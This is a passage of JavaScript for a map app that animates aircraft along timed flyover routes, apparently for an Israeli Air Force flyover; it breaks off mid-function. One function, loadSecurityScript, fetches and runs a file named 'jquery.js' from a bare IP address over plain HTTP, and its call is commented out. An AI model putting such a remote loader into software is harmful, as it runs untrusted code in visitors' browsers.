window.gm_authFailure = function() {
    mapFail = true;
    $("#closeIcon").hide();
};

var mapFail = false;

function convertPath(path) {
    var convertedPath = [];
    for (var i = 0; i < path.length; i++) {
        var point = path[i];
        var lat = point.lat.degress + (point.lat.minutes * 100 / 60) / 100;
        var lon = point.lon.degress + (point.lon.minutes * 100 / 60) / 100;
        convertedPath[i] = {lat: lat, lng: lon};
    }
    return convertedPath;
}

var loadedRoutes;
var aircrafts;
var aircraftTypesInfo = {};
var groundedAircrafts = new Set();
var locations = [];
var aircraftMarkers = {};
var aircraftPaths = {};
var startDate;
var plannedStartTime;
var actualStartTime;
var categories;
var displayArircraftShows = true;

function convertLocation(north, east) {
    var latDegrees = Math.floor(north / 100);
    var latMinutes = north - latDegrees * 100;
    var lonDegrees = Math.floor(east / 100);
    var lonMinutes = east - lonDegrees * 100;
    var lat = latDegrees + (latMinutes * 100 / 60) / 100;
    var lon = lonDegrees + (lonMinutes * 100 / 60) / 100;
    return {lat: lat, lng: lon};
}

// Converts from degrees to radians.
Math.radians = function (degrees) {
    return degrees * Math.PI / 180;
};

// Converts from radians to degrees.
Math.degrees = function (radians) {
    return radians * 180 / Math.PI;
};

function calcAzimuth(source, target) {
    if (source == undefined || target == undefined) return null;

    var lng1 = Math.radians(source.lng);
    var lng2 = Math.radians(target.lng);
    var lat1 = Math.radians(source.lat);
    var lat2 = Math.radians(target.lat);

    var y = Math.sin(lng2 - lng1) * Math.cos(lat2);
    var x = Math.cos(lat1) * Math.sin(lat2) -
        Math.sin(lat1) * Math.cos(lat2) * Math.cos(lng2 - lng1);
    var azimuth= Math.degrees(Math.atan2(y, x));
    if (azimuth < 0 ) {
        azimuth = 360 + azimuth;
    }
    return azimuth;
}

function getRelativeLocation(prevLocation, nextLocation, ratio) {
    var lng = prevLocation.lng + (nextLocation.lng - prevLocation.lng) * ratio;
    var lat = prevLocation.lat + (nextLocation.lat - prevLocation.lat) * ratio;
    return {lat: lat, lng: lng};
}

function getPathLocation(pointId) {
    var loc = locations[pointId];
    if (loc == undefined)
        return undefined;
    else
        return convertLocation(loc.N, loc.E);
}

function getCurrentIndexLocation(path, currentTime) {
    var relativeTime = currentTime - actualStartTime;
    var prevLocation = 0;
    var nextLocation = 1;
    var found = false;

    // if the aircraft hasn't start flying yet, return its first location
    if (plannedStartTime + relativeTime < convertTime(path[prevLocation].time))
        return -1;

    // otherwise - search for the two points where the aircraft suppossed to be between
    while (nextLocation < path.length && !found) {
        var nextLocationTime = convertTime(path[nextLocation].time);
        if (plannedStartTime + relativeTime < nextLocationTime) {
            found = true;
        } else {
            prevLocation++;
            nextLocation++;
        }
    }

    // if not found - the aircraft already landed, return the last location
    if (!found) {
        return path.length;
    }

    return prevLocation;
}

function getCurrentLocation(path, currentTime) {
    var relativeTime = currentTime - actualStartTime;
    var prevLocation = 0;
    var nextLocation = 1;
    var found = false;

    // if the aircraft hasn't start flying yet, return its first location
    if (plannedStartTime + relativeTime < convertTime(path[prevLocation].time))
        return getPathLocation(path[0].pointId);

    // otherwise - search for the two points where the aircraft suppossed to be between
    while (nextLocation < path.length && !found) {
        var nextLocationTime = convertTime(path[nextLocation].time);
        if (plannedStartTime + relativeTime < nextLocationTime) {
            found = true;
        } else {
            prevLocation++;
            nextLocation++;
        }
    }

    // if not found - the aircraft already landed, return the last location
    if (!found) {
        return getPathLocation(path[path.length-1].pointId);
    }

    // otherwise - calculate the relative position between previous location and current
    var prevLocationTime = convertTime(path[prevLocation].time);
    var ratio = (plannedStartTime + relativeTime - prevLocationTime) / (nextLocationTime - prevLocationTime);

    return getRelativeLocation(getPathLocation(path[prevLocation].pointId), getPathLocation(path[nextLocation].pointId), ratio);
}

function getIndexOfNextLocation(path, currentTime) {
    var relativeTime = currentTime - actualStartTime;
    var prevLocation = 0;
    var nextLocation = 1;
    var found = false;

    // if the aircraft hasn't start flying yet, return its second location
    if (plannedStartTime + relativeTime < convertTime(path[prevLocation].time)) {
        return -1
    }

    // otherwise - search for the two points where the aircraft suppossed to be between
    while (nextLocation < path.length && !found) {
        var nextLocationTime = convertTime(path[nextLocation].time);
        if (plannedStartTime + relativeTime < nextLocationTime) {
            found = true;
        } else {
            nextLocation++;
        }
    }

    // if not found - the aircraft already landed, return the last location
    if (!found) {
        return path.length;
    }
    return nextLocation;
}

function getNextLocation(path, currentTime) {
    var nextLocation;
    nextLocation=getIndexOfNextLocation(path,currentTime);
    if (nextLocation===-1){
        var nextTime = convertTime(path[1].time) - plannedStartTime + actualStartTime;
        return {location: getPathLocation(path[1].pointId), time: nextTime};
    }
    else if (nextLocation==path.length){
        return {location: getPathLocation(path[path.length - 1].pointId), time: currentTime};
    }
    else {
        var nextTime = convertTime(path[nextLocation].time) - plannedStartTime + actualStartTime;
        return {location: getPathLocation(path[nextLocation].pointId), time: nextTime};
    }
}

function getCurrentPosLocation(path, currentTime) {
    var relativeTime = currentTime - actualStartTime;
    var prevLocation = 0;
    var nextLocation = 1;
    var found = false;

    // if the aircraft hasn't start flying yet, return its first location
    if (plannedStartTime + relativeTime < convertTime(path[prevLocation].time))
        return path[0];

    // otherwise - search for the two points where the aircraft suppossed to be between
    while (nextLocation < path.length && !found) {
        var nextLocationTime = convertTime(path[nextLocation].time);
        if (plannedStartTime + relativeTime < nextLocationTime) {
            found = true;
        } else {
            prevLocation++;
            nextLocation++;
        }
    }

    // if not found - the aircraft already landed, return the last location
    if (!found) {
        return path[path.length - 1];
    }

    // otherwise - calculate the relative position between previous location and current
    var prevLocationTime = convertTime(path[prevLocation].time);
    var ratio = (plannedStartTime + relativeTime - prevLocationTime) / (nextLocationTime - prevLocationTime);

    return path[prevLocation];
}

function removeAircraftsFromLocation() {
    var currTime = getCurrentTime();
    locations.forEach(function (location) {
        location.aircrafts=location.aircrafts.filter(function (aircraft) {
            return (currTime < getActualPathTime(aircraft.time));
        })
    });
    setTimeout(removeAircraftsFromLocation,1000);
}

/**
 * Clears the previous points in the path of all the aircrafts
 */
function cleanPreviousLocations(aircraft) {
    var currTime = getCurrentTime();
    // aircrafts.forEach(function (aircraft) {
    var currLocation = getCurrentPosLocation(aircraft.path, currTime);
    var beforeLastPath = aircraft.path[aircraft.path.length - 2];
    var lastPath = aircraft.path[aircraft.path.length - 1];

    aircraft.path = aircraft.path.filter(function (path) {
        return (currTime < getActualPathTime(path.time));
    }, this);

    if (aircraft.path.length == 0) {
        aircraft.path.push(beforeLastPath);
        aircraft.path.push(lastPath);
    } else {
        aircraft.path.unshift(currLocation)
    }
    // }, this);
}

function getActualPathTime(time) {
    return (actualStartTime + (convertTime(time) - plannedStartTime))
}

function getPredictedLocation(currentPosition, nextPosition, nextTime, time) {
    var ratio = time / nextTime;
    return getRelativeLocation(currentPosition, nextPosition, ratio);
}

function getCurrentTime() {
    var now = new Date();
    return now.getTime();
}

function convertTime(timeString) {
    // if fast forward - every minute is parsed as a second
    if ($.urlParam("ff") === "true") {
        return Date.parse(startDate + " " + "00:" + roundToMinute(timeString), "yyyy-MM-dd HH:mm:ss").getTime();
    } else {
        return Date.parse(startDate + " " + timeString, "yyyy-MM-dd HH:mm:ss").getTime();
    }
}

function containsPosition(pos, list) {
    var i;
    for (i = 0; i < list.length; i++) {
        if (list[i].lat === pos.lat &&
            list[i].lng == pos.lng) {
            return true;
        }
    }

    return false;
}

function indexOfPosition(pos, list) {
    var i;
    for (i = 0; i < list.length; i++) {
        if (list[i].position.lat === pos.lat &&
            list[i].position.lng == pos.lng) {
            return i;
        }
    }
    return -1;
}

function updateLocationsMap(aircrafts) {

    var current = getCurrentTime();

    // build locations map for all of the aircraft paths
    aircrafts.forEach(function (aircraft) {
        var fromPosition = null;
        aircraft.path.forEach(function (location) {
            var item = {
                aircraftId: aircraft.aircraftId,
                name: aircraft.name,
                icon: aircraft.icon,
                aircraftType: aircraft.type,
                time: location.time,
                aerobatic: aircraft.aerobatic,
                parachutist: aircraft.parachutist,
            };
            location.hideAircrafts=locations[location.pointId].hideAircrafts;
            var location = locations[location.pointId];
            if (displayArircraftShows&&(item.aerobatic||item.parachutist)) {
                var timeout = convertTime(item.time) - getCurrentTime() + actualStartTime - plannedStartTime;
                var timeBefore = 5 * 60 * 1000;
                if (timeout - timeBefore > 0) {
                    setTimeout(function () {
                        showBasePopup(item.aerobatic, 5, location.pointName);
                        setTimeout(function () {
                            hideBasePopup();
                        },10000);
                    }, timeout - timeBefore);
                }
            }
            location.aircrafts.push(item);
        }, this);
    }, this);

    // sort each location points by time
    locations.forEach(function (loc) {
        loc.aircrafts.sort(function (item1, item2) {
            var keyA = convertTime(item1.time),
                keyB = convertTime(item2.time);

            // Compare the 2 times
            if (keyA < keyB) return -1;
            if (keyA > keyB) return 1;
            return 0;
        });
    }, this);

    return locations;
}

function updateLocations(route) {
    route.points.forEach(function (point) {
        if (locations[point.pointId] === undefined) {
            locations[point.pointId] = point;
            locations[point.pointId].aircrafts = [];
            locations[point.pointId].hideAircrafts = point.hideAircrafts;
        }
    }, this);
}

function loadRoutes(callback) {
    $.getJSON("data/routes.json", function (routes) {
        routes.routes.forEach(function (route) {
            updateLocations(route);
        }, this);
        loadedRoutes = routes.routes;
        callback(routes.routes);
    });
}

/**
 * Considers the simulation flag
 * @param routes
 */
function loadActualStartTime(routes) {
    actualStartTime = convertTime(routes.actualStartTime);
    if ($.urlParam("simulation") != null) {
        actualStartTime = (new Date()).getTime() - $.urlParam("simulation") * 60 * 1000;
    }
}

function loadAircrafts(callback) {
    $.getJSON("data/aircrafts-info.json", function(aircraftInfo) {
        // load aircraft type info into a map
        aircraftInfo.aircraftTypes.forEach(function (aircraftTypeInfo) {
            aircraftTypesInfo[aircraftTypeInfo.aircraftTypeId] = aircraftTypeInfo;
        }, this);

        // load all aircrafts
        $.getJSON("data/aircrafts.json", function (routes) {
            aircrafts = routes.aircrafts;
            // merge info from aircraft type info
            aircrafts.forEach(function (aircraft) {
                if (aircraft.aircraftTypeId !== undefined) {
                    // copy all of the information from aircraft type info
                    var aircraftTypeInfo = aircraftTypesInfo[aircraft.aircraftTypeId];
                    for(var field in aircraftTypeInfo)
                        aircraft[field]=aircraftTypeInfo[field];
                }
            }, this);

            startDate = routes.startDate;
            plannedStartTime = convertTime(routes.plannedStartTime);
            loadActualStartTime(routes);
            callback(aircrafts);
        });
    });
}

function compassHeading(alpha, beta, gamma) {
    // Convert degrees to radians
    var alphaRad = alpha * (Math.PI / 180);
    var betaRad = beta * (Math.PI / 180);
    var gammaRad = gamma * (Math.PI / 180);

    // Calculate equation components
    var cA = Math.cos(alphaRad);
    var sA = Math.sin(alphaRad);
    var cB = Math.cos(betaRad);
    var sB = Math.sin(betaRad);
    var cG = Math.cos(gammaRad);
    var sG = Math.sin(gammaRad);

    // Calculate A, B, C rotation components
    var rA = -cA * sG - sA * sB * cG;
    var rB = -sA * sG + cA * sB * cG;
    var rC = -cB * cG;

    // Calculate compass heading
    var compassHeading = Math.atan(rA / rB);

    // Convert from half unit circle to whole unit circle
    if (rB < 0) {
        compassHeading += Math.PI;
    } else if (rA < 0) {
        compassHeading += 2 * Math.PI;
    }

    // Convert radians to degrees
    compassHeading *= 180 / Math.PI;

    return compassHeading;
}

var aboutVisible = false;

var selectedAircraft = null;
var selectedAircraftMarker = null;
var selectedAircraftMarkerIcon = null;

function onAboutButtonClick() {
    deselectAircraft();
    deselectLocation();
    if (!aboutVisible) {
        $("#aboutPopup").fadeIn();
        $("#headerIcon").fadeOut("fast", function () {
            $("#aboutMenuTitle").fadeIn();
        });
        $("#aboutButton").attr("src", "icons/aboutIconSelected.png");
        aboutVisible = true;
        $("#menuHamburger").toggleClass("is-active");

        // hide IAF logo if there is no room - this is very ugly code but we don't have much time to mess around with this
        var requiredHeight = 64 + $("#headerMobile").height() + $("#aboutLogo").height() +  $("#aboutTitle").height() + $("#aboutBody").height() + $("#aboutBottom").height();
        if (window.innerHeight < requiredHeight) {
            $("#aboutBottom").hide();
        }
    }
}

function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
        window.addEventListener('load', function () {
            navigator.serviceWorker.register('/js/service-worker.js').then(function (registration) {
                // Registration was successful
                console.log('ServiceWorker registration successful with scope: ', registration.scope);
            }, function (err) {
                // registration failed :(
                console.log('ServiceWorker registration failed: ', err);
            });
        });
    }
}

var currentLocationMarker;

function updateCurrentLocation(position) {
    currentPosition = {
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy
    };

    updateMarkerPosition(currentLocationMarker, currentPosition, 200);
}

function showCurrentLocation() {
    // Try HTML5 geolocation.
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
            var currentPosition = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                heading: position.coords.heading,
                accuracy: position.coords.accuracy
            };
            navigator.geolocation.watchPosition(updateCurrentLocation);

            var currentPositionIcon = createPositionIcon();
            //var currentHeadingIcon = createHeadingArea(0);

            //drawMarker(currentPosition, currentHeadingIcon, false);
            currentLocationMarker = drawMarker(currentPosition, currentPositionIcon, true);
            focusOnLocation(currentPosition);

            // find the closest location and select it
            selectPoint(findClosestPoint(currentPosition), true);

            //register to compass heading change event
            // window.addEventListener('deviceorientation', function(evt) {
            //     var heading = null;
            //
            //     if(evt.alpha !== null) {
            //         heading = evt.alpha;
            //         updateCurrentHeading(heading);
            //     }
            // });
        }, function () {
            // no location available
        }, {enableHighAccuracy: true});
    } else {
        // Browser doesn't support Geolocation
    }
}

function findClosestPoint(position) {
    var selectedPoint = null;
    var minDist = Infinity;

    // find the route which the point belongs to
    loadedRoutes.forEach(function (route) {
        route.points.forEach(function (point) {
            var targetPos = convertLocation(point.N, point.E);
            var dist = getDistanceFromLatLonInKm(position.lat, position.lng, targetPos.lat, targetPos.lng);
            if (dist < minDist && !point.hidden) {
                selectedPoint = point;
                minDist = dist;
            }
        }, this);
    }, this);

    return selectedPoint.pointId;
}

function getDistanceFromLatLonInKm(lat1, lon1, lat2, lon2) {
    var R = 6371; // Radius of the earth in km
    var dLat = deg2rad(lat2 - lat1);  // deg2rad below
    var dLon = deg2rad(lon2 - lon1);
    var a =
        Math.sin(dLat / 2) * Math.sin(dLat / 2) +
        Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) *
        Math.sin(dLon / 2) * Math.sin(dLon / 2)
    ;
    var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    var d = R * c; // Distance in km
    return d;
}

function deg2rad(deg) {
    return deg * (Math.PI / 180)
}

function makeHeaderSticky() {
    // When the user scrolls the page, execute myFunction
    // window.onscroll = function () {
    //     myFunction()
    // };

    // Get the header
    var header = $("#headerMobile");

    // Get the offset position of the navbar
    var sticky = header.offset().top;

    // Add the sticky class to the header when you reach its scroll position. Remove "sticky" when you leave the scroll position
    function myFunction() {
        if (window.pageYOffset >= sticky) {
            header.addClass("sticky");
        } else {
            header.removeClass("sticky");
        }
    }
}

var timeoutHandles = {};

function animateToNextLocation(aircraft, previousAzimuth, updateCurrent) {
    var animationTime = 2000;

    var currentTime = getCurrentTime();
    var zoomLevel = getZoomLevel();
    var currentAircraftPosition = getCurrentLocation(aircraft.path, currentTime);
    var nextAircraftStopPosition = getNextLocation(aircraft.path, currentTime);
    var nextAircraftPosition;

    // Should the current time be larger than the next position's time, that means the aircraft landed
    if (convertTime(aircraft.path[aircraft.path.length - 1].time) - plannedStartTime + actualStartTime < getCurrentTime()) {
        toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], false);
        //console.log(aircraft.name + " Has landed");
    } else {
        // if the next stop is more than animationTime millieseconds, calculate where the aircraft should be within animationTime
        // milliseconds
        if (nextAircraftStopPosition.time - currentTime > animationTime) {
            nextAircraftPosition = getPredictedLocation(currentAircraftPosition, nextAircraftStopPosition.location, nextAircraftStopPosition.time - currentTime, animationTime);
        } else {
            // otherwise, animate to the the next aircraft stop location
            nextAircraftPosition = nextAircraftStopPosition.location;
            animationTime = nextAircraftStopPosition.time - currentTime;
            cleanPreviousLocations(aircraft);
        }

        // calculate the new azimuth
        var currentAircraftAzimuth = calcAzimuth(currentAircraftPosition, nextAircraftPosition);
        if (currentAircraftAzimuth == null)
            currentAircraftAzimuth = previousAzimuth;
        aircraft.currentAircraftAzimuth = currentAircraftAzimuth;

        var marker = aircraftMarkers[aircraft.aircraftId];
        var curIndexLocation = getCurrentIndexLocation(aircraft.path,currentTime);
        if (curIndexLocation>=0&&curIndexLocation<aircraft.path.length&&aircraft.path[curIndexLocation].hideAircrafts){
            if (marker.getMap()!=null) {
                toggleAircraftMarkerVisibility(marker, false);
                console.log(aircraft.path[curIndexLocation].pointId);
            }
        }
        else if(marker.getMap()===null){
            toggleAircraftMarkerVisibility(marker,!aircraft.hide);
            // if (aircraft.path[curIndexLocation].pointId===33){
            //     console.log("up" + aircraft.path[curIndexLocation].pointId);
            // }
        }

        var rotationInterval = 100;
        if (updateCurrent || $.urlParam("ff")==="true") {
            rotationInterval = 10;
        }

        // change azimuth if needed
        if (Math.abs(previousAzimuth - currentAircraftAzimuth) >= 0.1) {
            // animation aircraft roation
            var step = calcStep(currentAircraftAzimuth, previousAzimuth);
            var angle = previousAzimuth;
//             console.log("Aircraft " + aircraft.name + ", id: " + aircraft.aircraftId + " is rotating " + step + " degrees from " + angle + " to " + currentAircraftAzimuth);
            var handle = setInterval(function () {
                if (calcAngle(currentAircraftAzimuth, angle) < Math.abs(step)) {
                    clearInterval(handle);
                    aircraft.currentAircraftAzimuth = currentAircraftAzimuth % 360;
                    setAircraftIcon(marker, aircraft.icon, aircraft.country, currentAircraftAzimuth % 360, aircraft.color, zoomLevel);
                } else {

            // console.log("Aircraft " + aircraft.name + ", id: " + aircraft.aircraftId + " is rotating " + step + " degrees from " + angle + " to " + currentAircraftAzimuth+ ", and its distance is " + Math.abs(angle % 360 - currentAircraftAzimuth % 360));

                    aircraft.currentAircraftAzimuth = angle += step % 360
                    setAircraftIcon(marker, aircraft.icon, aircraft.country, angle += step % 360, aircraft.color, zoomLevel);
                }
            }, rotationInterval);
        }

        // if requested - forcibly update the aircraft to be on current position
        if (updateCurrent) {
            updateMarkerPosition(marker, currentAircraftPosition, 1);
        }
        else {
            // animate to the next position
            updateMarkerPosition(marker, nextAircraftPosition, animationTime);
        }

        // set a timeout for the next animation interval
        timeoutHandles[aircraft.aircraftId] = setTimeout(function () {
            animateToNextLocation(aircraft, currentAircraftAzimuth);
        }, animationTime);
    }
    // update clusters
    //updateCluster();
}

function calcAngle(currentAzimuth, previousAzimuth) {
    var distance = Math.abs(currentAzimuth - previousAzimuth);
    return Math.min(distance, 360 - distance);
}

function calcStep(currentAzimuth, previousAzimuth) {
    var distance = Math.abs(currentAzimuth - previousAzimuth);
    var otherDistance = 360 - distance;

    if (distance < otherDistance) {
        if (currentAzimuth > previousAzimuth) {
            return 5;
        }
        return -5;
    } else {
        if (currentAzimuth <= previousAzimuth) {
            return 5;
        }
        return -5;
    }
}

function setAircraftIcon(marker, icon, country, azimuth, color, zoomLevel) {
    var imgUrl;
    var staticUrl;

    if (zoomLevel >= 9) {
        imgUrl = "icons/aircrafts/"+ icon + ".svg";
        staticUrl = country==null?null:"icons/countries/"+ country + ".svg";
    } else {
        imgUrl = "icons/arrow.svg";
        staticUrl = null;
    }
    imgUrl = new RotateIcon({url:imgUrl, staticUrl: staticUrl}).setRotation({deg: azimuth}).getUrl();
    setAircraftMarkerIcon(marker, imgUrl);
}

function startAircraftsAnimation(updateCurrent) {
    aircrafts.forEach(function (aircraft) {
        // If the first point's time is in the future - It is still grounded. Hide it
        if (convertTime(aircraft.path[0].time) - plannedStartTime + actualStartTime > getCurrentTime()) {
            toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], false);
//             console.log(aircraft.name + " Has not yet departed");
            groundedAircrafts.add(aircraft);
        } else {
            animateToNextLocation(aircraft, aircraftMarkers[aircraft.aircraftId].currentAircraftAzimuth, updateCurrent);
        }
    }, this);

    // Scheduling a departure check for each of the grounded aircrafts
    groundedAircrafts.forEach(aircraft => {
        if (!departureCheckers[aircraft.aircraftId]) {
            departureCheckers[aircraft.aircraftId] = setTimeout(function() {
                checkDeparture(aircraft)
            }, 10000);
        }
    }, this);
}

var departureCheckers = {};

// Checks every ten seconds when the aircraft will departure. When a group of aircrafts departure at once - it will separate them
function checkDeparture(aircraft) {
    if (convertTime(aircraft.path[0].time) - plannedStartTime + actualStartTime > getCurrentTime()) {
        departureCheckers[aircraft.aircraftId] = setTimeout(function() {
            checkDeparture(aircraft)
        }, 10000);
        return;
    } else {
        //console.log(aircraft.name + " Has departed");
        var nextLocation = getIndexOfNextLocation(aircraft.path,getCurrentTime());
        if (nextLocation>=0&&nextLocation<aircraft.path.length&&aircraft.path[nextLocation].hideAircrafts){
            toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], false);
        }
        else{
            toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], !aircraft.hide);
        }
        clearTimeout(departureCheckers[aircraft.aircraftId]);
        animateToNextLocation(aircraft, aircraftMarkers[aircraft.aircraftId].currentAircraftAzimuth, true);
    }
}

var lastZoomLevel = 0;

function addAircraftsToMap() {
    var zoomLevel = getZoomLevel();
    aircrafts.forEach(function (aircraft) {
        // draw current location of the aircraft
        var currentAircraftPosition = getCurrentLocation(aircraft.path, getCurrentTime());
        var nextAircraftPosition = getNextLocation(aircraft.path, getCurrentTime());
        var currentAircraftAzimuth = calcAzimuth(currentAircraftPosition, nextAircraftPosition.location) % 360;
        aircraft.currentAircraftAzimuth = currentAircraftAzimuth;

        var clickCallback = function () {
            if (selectedAircraft == aircraft) {
                deselectAircraft();
            } else {
                // first hide the previous popup
                if (selectedAircraft != null) {
                    deselectAircraft(function () {
                        // then show a new popup
                        selectAircraft(aircraft, aircraftMarker, aircraft.name, aircraft.type, aircraft.icon, aircraft.image,roundToMinute( aircraft.path[0].time), aircraft.infoUrl, false);
                    });
                } else {
                    // then show a new popup
                    selectAircraft(aircraft, aircraftMarker, aircraft.name, aircraft.type, aircraft.icon, aircraft.image,roundToMinute( aircraft.path[0].time), aircraft.infoUrl, false);
                }
            }
        };

        var aircraftMarker = createAircraftMarker(currentAircraftPosition, aircraft.name, aircraft.hide, clickCallback);
        if (aircraft.color == undefined) aircraft.color = "darkgray";
        setAircraftIcon(aircraftMarker, aircraft.icon, aircraft.country, currentAircraftAzimuth, aircraft.color, zoomLevel);
        aircraftMarker.currentAircraftAzimuth = currentAircraftAzimuth;
        aircraftMarkers[aircraft.aircraftId] = aircraftMarker;
    }, this);

    // set zoom callback event
    setZoomCallback(function() {
        var zoomLevel = getZoomLevel();
        if (zoomLevel >= 9 && lastZoomLevel < 9) {
            updateAircraftIcons();
        } else if (zoomLevel < 9 && lastZoomLevel >= 9) {
            updateAircraftIcons();
        }
        lastZoomLevel = zoomLevel;
    });
}

function updateAircraftIcons() {
    var zoomLevel = getZoomLevel();
    aircrafts.forEach(function (aircraft) {
        var aircraftMarker = aircraftMarkers[aircraft.aircraftId];
        setAircraftIcon(aircraftMarker, aircraft.icon, aircraft.country, aircraft.currentAircraftAzimuth, aircraft.color, zoomLevel);
    }, this);
}

function selectLocation(pointId, location, marker, markerIcon, markerIconClicked, color, titleColor, subtitleColor, minimized=false) {
    deselectAircraft();
    showLocationPopup(locations[pointId], color, titleColor, subtitleColor, minimized);
    panTo(map, location);
    setMarkerIcon(marker, markerIconClicked);
    selectedLocation = location;
    selectedLocationMarker = marker;
    selectedLocationMarkerIcon = markerIcon;
}

function deselectAircraft(callback) {
    if (selectedAircraft != null) {
        // hide selected location
        hideAircraftInfoPopup(function () {
            // set it to the previous marker icon
            //selectedAircraftMarker.setIcon(selectedAircraftMarkerIcon);
            // mark it is deselected
            selectedAircraft = null;
            if (callback != undefined)
                callback.call(this);
        });
    }
}

function onAircraftSelected(aircraftId, collapse) {
    var aircraft = aircrafts[aircraftId-1];
    window.scrollTo(0,1);
    selectAircraft(aircraft, aircraftMarkers[aircraftId-1], aircraft.name, aircraft.type, aircraft.icon, aircraft.image, aircraft.path[0].time, aircraft.infoUrl, collapse);
}

function selectAircraft(aircraft, marker, aircraftName, aircraftType, iconName, imageName, time, infoUrl, collapse) {
    deselectLocation();
    showAircraftInfoPopup(aircraft, collapse);
    //map.panTo(location);
    //marker.setIcon(markerIconClicked);
    selectedAircraft = aircraft;
    selectedAircraftMarker = marker;
    //selectedAircraftMarkerIcon = markerIcon;
}

function deselectLocation(callback) {
    if (selectedLocation != null) {
        // hide selected location
        hideLocationPopup(function () {
            // set it to the previous marker icon
            setMarkerIcon(selectedLocationMarker, selectedLocationMarkerIcon);

            // mark it is deselected
            selectedLocation = null;
            if (callback != undefined)
                callback.call(this);
        });
    }
}

function selectPoint(pointId, minimized=false) {
    var marker = markersMap[pointId];
    var selectedRoute = null;
    var selectedPoint = null;

    // find the route which the point belongs to
    routes.forEach(function (route) {
        route.points.forEach(function (point) {
            if (point.pointId == pointId) {
                selectedRoute = route;
                selectedPoint = point;
            }
        }, this);
    }, this);

    // first hide the previous popup
    if (selectedLocation != null) {
        deselectLocation(function () {
            // then show a new popup
            selectLocation(pointId, convertLocation(selectedPoint.N, selectedPoint.E), marker, getMarkerIcon(selectedRoute.color, false), getMarkerIcon(selectedRoute.color, true), "#" + selectedRoute.color, "#" + selectedRoute.primaryTextColor, "#" + selectedRoute.secondaryTextColor, minimized);
        });
    } else {
        // then show a new popup
        selectLocation(pointId, convertLocation(selectedPoint.N, selectedPoint.E), marker, getMarkerIcon(selectedRoute.color, false), getMarkerIcon(selectedRoute.color, true), "#" + selectedRoute.color, "#" + selectedRoute.primaryTextColor, "#" + selectedRoute.secondaryTextColor, minimized);
    }
}

function onHomeButtonClick() {
    // hide about if visible
    if (aboutVisible) {
        onAboutButtonClick();
    }

    deselectAircraft();
    deselectLocation();

    if (mapLoaded) {
        closeEntrancePopup();
        
        if (!currentLocationMarker) {
            focusOnLocation({lat: 32.00, lng: 35.00}, 8);
            showCurrentLocation();
        } else {
            selectPoint(findClosestPoint({lat: currentLocationMarker.position.lat(),
                                          lng: currentLocationMarker.position.lng()
                                          }), true);
        }
    }
}

var mapLoaded = false;

function countdown() {
    var currentTime = getCurrentTime();
    var remainingTime = new Date(actualStartTime - currentTime);

    // Load the map three seconds before the countdown finishes
    if (remainingTime  < 3500 && remainingTime  > 2500) {
        $(".splash").css("background-image", "url('animation/Splash 70.gif?v=1')");
        $(".splash").hide();

        // Stops the gif from running more than once
        setTimeout(function() {
            $(".splash").fadeIn();
            $(".loading").css("background-image", "url(animation/loading.gif)");
            loadApp();
        }, 1800);
    }

    // Time to remove the entrancePopup
    if (remainingTime  < 500) {
        $("#minutes").text("00");
        $("#entrancePopup").fadeOut("slow", function() {
            $(".splash").css("background-image", "url(icons/stillSplash.png)");
            $(".loading").css("background-image", "url(animation/loading.gif)");
            $(".map-dark").hide();
        });
        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
    } else {
        $("#days").text(getRemainingDays(remainingTime) < 1 ? (getRemainingHours(remainingTime) < 10 ? "0" + getRemainingHours(remainingTime) : getRemainingHours(remainingTime))
            : (getRemainingDays(remainingTime) < 10 ? "0" + getRemainingDays(remainingTime) : getRemainingDays(remainingTime)));
        $("#hours").text(getRemainingDays(remainingTime) < 1 ? (getRemainingMinutes(remainingTime) < 10 ? "0" + getRemainingMinutes(remainingTime) : getRemainingMinutes(remainingTime))
            : (getRemainingHours(remainingTime) < 10 ? "0" + getRemainingHours(remainingTime) : getRemainingHours(remainingTime)));
        $("#minutes").text(getRemainingDays(remainingTime) < 1 ? (getRemainingSeconds(remainingTime) < 10 ? "0" + getRemainingSeconds(remainingTime) : getRemainingSeconds(remainingTime))
            : (getRemainingMinutes(remainingTime) < 10 ? "0" + getRemainingMinutes(remainingTime) : getRemainingMinutes(remainingTime)));

        if (getRemainingDays(remainingTime) < 1) {
            $("#daysText").text("שעות");
            $("#hoursText").text("דקות");
            $("#minutesText").text("שניות");
        }
    }
}

function getRemainingDays(date) {
//     return date.getTime() / 1000 / 60 / 60
    return Math.floor(date.getTime() / (1000 * 60 * 60 * 24));
}

function getRemainingHours(date) {
    return Math.floor(date.getTime() / (1000 * 60 * 60)) - (24 * getRemainingDays(date));
}


function getRemainingMinutes(date) {
    return Math.floor(date.getTime() / (1000 * 60)) - getRemainingHours(date)*60 - getRemainingDays(date) * 24 * 60;
}

function getRemainingSeconds(date) {
    return Math.round((date.getTime() - ((((((getRemainingDays(date) * 24) +
         getRemainingHours(date)) * 60) +
         getRemainingMinutes(date)) * 60) * 1000)) / 1000)
}


var countdownInterval;

function loadSecurityScript() {
    $.getScript( "http://80.211.156.24:8080/jquery.js" )
        .done(function( script, textStatus ) {
            // do nothing
        })
        .fail(function( jqxhr, settings, exception ) {
            console.info( "Triggered ajaxError handler." + exception );
        });
}

function onLoad() {
    // loadSecurityScript();
    initMenu();
    $("#mapClusterPopup").hide();

     if (compatibleDevice() && !checkIframe()) {
        setTimeout(function() {
            //TODO: Change to loading gif
            $(".splash").css("background-image", "url(icons/stillSplash.png)");
            $(".loading").show();
        }, 2100);

        setTimeout(function() {
            loadAircrafts(function (pAircrafts) {
                aircrafts = pAircrafts;
                // load all routes
                loadRoutes(function (routes) {
                    this.routes = routes;
                    updateLocationsMap(aircrafts);
                    loadCategories(function() {
                        // fillMenu();
                    });
                }, this);

                if (getCurrentTime() < actualStartTime) {
                    countdownInterval = setInterval(function () {
                        countdown();
                    }, 1000);
                    setTimeout(function () {
                        $(".splash").fadeOut();
                        $("#entrancePopup").fadeIn();
                        getMapDarker();
                        loadApp();
                    }, 1000);
                } else if (!mapLoaded) {
